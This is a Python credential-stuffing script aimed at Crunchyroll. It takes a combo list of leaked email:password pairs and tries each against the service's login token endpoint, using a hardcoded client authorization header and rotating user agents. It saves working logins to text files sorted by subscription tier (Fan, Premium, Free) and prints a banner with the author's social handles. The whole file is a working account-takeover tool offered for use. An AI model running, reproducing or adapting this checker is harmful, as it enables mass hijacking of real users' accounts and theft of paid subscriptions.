import requests,uuid,os
from getuseragent import UserAgent
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
def whisper(email,psw):
 id = str(uuid.uuid4())
 ua = UserAgent("ios").Random()
 response = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data={"username":email,"password":psw,"grant_type": "password","scope": "offline_access","device_id": id}, headers={"Etp-Anonymous-Id": id,"Content-Type": "application/x-www-form-urlencoded; charset=utf-8","Accept": "*/*","Authorization": "Basic cW1idnFfdXFuMmc2MXFrZm1vMHU6UkUyRERRMXJtdmQ4Y0dDUGphWHQxSk9aVk5FRTFCb0o=","Accept-Encoding": "gzip, deflate, br","User-Agent": ua,"Accept-Language": "ar-LY;q=1.0, en-GB;q=0.9","Connection": "close"})
 if '"access_token"' in response.text:
    tk = response.json()['access_token']
    print(f'{G}[√] Hit : {B}{email} | {psw}')
    open('CrunchyRoll.txt','a+').write(f'{email}:{psw}\n')
    user_info_response = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers={"Host": "beta-api.crunchyroll.com","Authorization": f"Bearer {tk}","Accept-Encoding": "gzip, deflate, br","User-Agent": "Crunchyroll/3.45.4 Android/9 okhttp/4.12.0"})
    external_id = user_info_response.json()['external_id']
    subscription_info_response = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers={"Host": "beta-api.crunchyroll.com","Authorization": f"Bearer {tk}","Accept-Encoding": "gzip, deflate, br","User-Agent": "Crunchyroll/3.45.4 Android/9 okhttp/4.12.0"})
    if 'fan' in str(subscription_info_response.json()):
     sub='Fan'
     print(f'{B}[+] Subscription : {G}{sub}')
     open(f'{sub}.txt','a+').write(f'{email}:{psw}\n')
    elif 'premium' in str(subscription_info_response.json()):
     sub='Premium'
     print(f'{B}[+] Subscription : {G}{sub}')
     open(f'{sub}.txt','a+').write(f'{email}:{psw}\n')
    elif 'Subscription Not Found' in str(subscription_info_response.json()):
     sub='Free'
     print(f'{B}[+] Subscription : {G}{sub}')
     open(f'{sub}.txt','a+').write(f'{email}:{psw}\n')
 elif 'invalid_credentials' in response.text:
     print(f'{E}[×] Wrong : {S}{email} | {psw}')
 elif '406 Not Acceptable' in response.text:
  print(f'[×] Error (VPN)')
 elif 'force_password_reset' in response.text:
  print(f'{S}[×] Force PassWord Reset : {E}{email} | {psw}')
 else:
  print(response.text)
os.system('cls')
os.system('clear')
print(f'''{G} _    _ _     _                 
{G}| |  | | |   (_)                
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}               | |            
{G}               |_|            
{G}[G] GitHub    : {B}@VIP-Whisper
{G}[I] InstaGram : {B}@Whisper_DEV
{G}[T] TeleGram  : {B}@WHI3PER''')
print(f'{E}ـ'*40)
path=input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ'*40)
for whis in open(path,'r').read().splitlines():
  acc=str(whis)
  acc=acc.split('\n')[0]
  email=acc.split(':')[0]
  psw=acc.split(':')[1].split(' ')[0]
  whisper(email,psw)